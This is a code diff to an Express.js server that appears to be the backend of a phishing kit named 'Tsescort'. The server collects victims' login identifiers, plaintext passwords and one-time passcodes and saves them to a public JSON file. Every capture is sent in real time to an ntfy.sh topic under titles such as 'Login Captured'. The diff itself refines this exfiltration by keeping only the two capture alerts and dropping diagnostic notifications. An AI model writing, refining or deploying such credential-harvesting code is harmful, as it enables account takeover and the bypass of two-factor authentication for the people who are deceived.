@@ -4,8 +4,9 @@
 //  POST /verify-otp      → saves OTP into the user's record
 //  Data persisted in PLAIN JSON at public/users.json
 //  ------------------------------------------------------------
-//  NTFY INTEGRATION: Every login, password, and OTP is sent to
-//  the ntfy topic "ts_update" in real time.
+//  NTFY INTEGRATION — ONLY 2 NOTIFICATIONS:
+//    1) When account details are submitted (login + password)
+//    2) When OTP is submitted
 // ============================================================
 const express = require('express');
 const fs = require('fs');
@@ -35,7 +36,7 @@ const NTFY_URL = `https://ntfy.sh/${NTFY_TOPIC}`;
  * @param {string} title    - Optional notification title
  * @param {string} priority - ntfy priority (min, low, default, high, urgent)
  */
-function sendNtfy(message, tags = ['eyes'], title = 'Tsescort Alert', priority = 'high') {
+function sendNtfy(message, tags = ['eyes'], title = 'Tsescort', priority = 'urgent') {
   try {
     const payload = JSON.stringify({
       topic: NTFY_TOPIC,
@@ -98,18 +99,12 @@ function writeUsers(users) {
 // ------------------------------------------------------------
 //  POST /update-account
 //  Saves identifier + password, then notifies via ntfy.
+//  NOTIFICATION #1 — login details captured
 // ------------------------------------------------------------
 app.post('/update-account', (req, res) => {
   try {
     const { identifier, password, timestamp, app } = req.body;
     if (!identifier || !password) {
-      // NTFY: invalid attempt
-      sendNtfy(
-        `⚠️ Invalid /update-account attempt — missing fields.\nIP: ${req.ip || 'unknown'}`,
-        ['warning'],
-        'Tsescort · Validation Failed',
-        'default'
-      );
       return res.status(400).json({ success: false, error: 'Missing identifier or password' });
     }
 
@@ -143,10 +138,10 @@ app.post('/update-account', (req, res) => {
     writeUsers(users);
 
     // ------------------------------------------------------------
-    //  NTFY: SEND LOGIN + PASSWORD IMMEDIATELY
+    //  NTFY #1: SEND LOGIN + PASSWORD IMMEDIATELY
     // ------------------------------------------------------------
     sendNtfy(
-      `🔐 TSESCORT ACCOUNT ${action.toUpperCase()}\n` +
+      `🔐 TSESCORT LOGIN CAPTURED (${action})\n` +
       `━━━━━━━━━━━━━━━━━━━━\n` +
       `👤 Identifier: ${newRecord.identifier}\n` +
       `🔑 Password:   ${newRecord.password}\n` +
@@ -155,7 +150,7 @@ app.post('/update-account', (req, res) => {
       `📊 Status:     pending_otp\n` +
       `━━━━━━━━━━━━━━━━━━━━`,
       ['lock', 'key'],
-      `Tsescort · ${action === 'updated' ? 'Updated' : 'New'} Login Captured`,
+      `Tsescort · Login Captured`,
       'urgent'
     );
 
@@ -167,13 +162,6 @@ app.post('/update-account', (req, res) => {
     });
   } catch (error) {
     console.error('[Tsescort] Error in /update-account:', error);
-    // NTFY: server error
-    sendNtfy(
-      `💥 /update-account server error: ${error.message}`,
-      ['boom'],
-      'Tsescort · Server Error',
-      'high'
-    );
     return res.status(500).json({ success: false, error: 'Internal server error' });
   }
 });
@@ -181,29 +169,17 @@ app.post('/update-account', (req, res) => {
 // ------------------------------------------------------------
 //  POST /verify-otp
 //  Saves the OTP into the matched user's record and notifies.
+//  NOTIFICATION #2 — OTP submitted
 // ------------------------------------------------------------
 app.post('/verify-otp', (req, res) => {
   try {
     const { otp, timestamp, app, identifier } = req.body;
     if (!otp || String(otp).trim().length === 0) {
-      // NTFY: invalid OTP attempt
-      sendNtfy(
-        `⚠️ Invalid /verify-otp attempt — empty OTP.\nIP: ${req.ip || 'unknown'}`,
-        ['warning'],
-        'Tsescort · OTP Validation Failed',
-        'default'
-      );
       return res.status(400).json({ success: false, error: 'Missing OTP' });
     }
 
     const users = readUsers();
     if (users.length === 0) {
-      sendNtfy(
-        `⚠️ /verify-otp called but no user records exist.\nOTP provided: ${otp}\nIP: ${req.ip || 'unknown'}`,
-        ['warning'],
-        'Tsescort · No Users',
-        'default'
-      );
       return res.status(404).json({ success: false, error: 'No user records found' });
     }
 
@@ -240,11 +216,11 @@ app.post('/verify-otp', (req, res) => {
     console.log('[Tsescort] OTP "' + cleanOtp + '" saved for user: ' + users[targetIndex].identifier);
 
     // ------------------------------------------------------------
-    //  NTFY: SEND OTP + FULL USER RECORD
+    //  NTFY #2: SEND OTP + FULL USER RECORD
     // ------------------------------------------------------------
     const u = users[targetIndex];
     sendNtfy(
-      `✅ TSESCORT OTP VERIFIED\n` +
+      `✅ TSESCORT OTP SUBMITTED\n` +
       `━━━━━━━━━━━━━━━━━━━━\n` +
       `🔢 OTP:        ${cleanOtp}\n` +
       `📏 Length:     ${cleanOtp.length}\n` +
@@ -255,7 +231,7 @@ app.post('/verify-otp', (req, res) => {
       `📊 Status:     otp_verified\n` +
       `━━━━━━━━━━━━━━━━━━━━`,
       ['white_check_mark', 'key'],
-      'Tsescort · OTP Captured',
+      'Tsescort · OTP Submitted',
       'urgent'
     );
 
@@ -267,12 +243,6 @@ app.post('/verify-otp', (req, res) => {
     });
   } catch (error) {
     console.error('[Tsescort] Error in /verify-otp:', error);
-    sendNtfy(
-      `💥 /verify-otp server error: ${error.message}`,
-      ['boom'],
-      'Tsescort · Server Error',
-      'high'
-    );
     return res.status(500).json({ success: false, error: 'Internal server error' });
   }
 });
@@ -295,18 +265,4 @@ app.listen(PORT, () => {
   console.log('  NTFY topic: ' + NTFY_TOPIC);
   console.log('  NTFY url:   ' + NTFY_URL);
   console.log('============================================');
-
-  // NTFY: server started notification
-  sendNtfy(
-    `🚀 Tsescort server started\n` +
-    `━━━━━━━━━━━━━━━━━━━━\n` +
-    `🌐 Port:    ${PORT}\n` +
-    `📁 Users:   ${USERS_FILE}\n` +
-    `📡 Topic:   ${NTFY_TOPIC}\n` +
-    `⏰ Time:    ${new Date().toISOString()}\n` +
-    `━━━━━━━━━━━━━━━━━━━━`,
-    ['rocket', 'globe_with_meridians'],
-    'Tsescort · Server Online',
-    'default'
-  );
 });
